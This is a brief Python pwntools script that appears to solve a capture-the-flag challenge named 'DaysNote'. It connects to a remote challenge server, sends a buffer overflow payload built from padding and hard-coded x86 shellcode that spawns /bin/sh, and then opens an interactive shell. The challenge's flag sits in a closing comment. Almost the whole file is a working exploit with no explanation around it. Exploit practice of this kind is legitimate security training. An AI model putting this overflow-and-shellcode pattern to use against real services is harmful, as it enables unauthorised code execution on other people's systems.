from pwn import *

shellcode = "\x31\xc0\x31\xd2\xb0\x0f\x2c\x04\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"

#s = process('./DaysNote')
s = remote('110.10.147.38', 8888)
e = ELF('./DaysNote')

ppppr = 0x080487b8

s.sendline('2016')

s.sendline('A'*4 + shellcode + 'A'*(361-len(shellcode)) + '\x30')

print s.recvuntil('cat flag\n')

s.interactive()

#flag{y0u Kn0w that? 1 yEAr is NoT 365 dAy! ACtuA11Y It is 365.25 dAY! >_O}
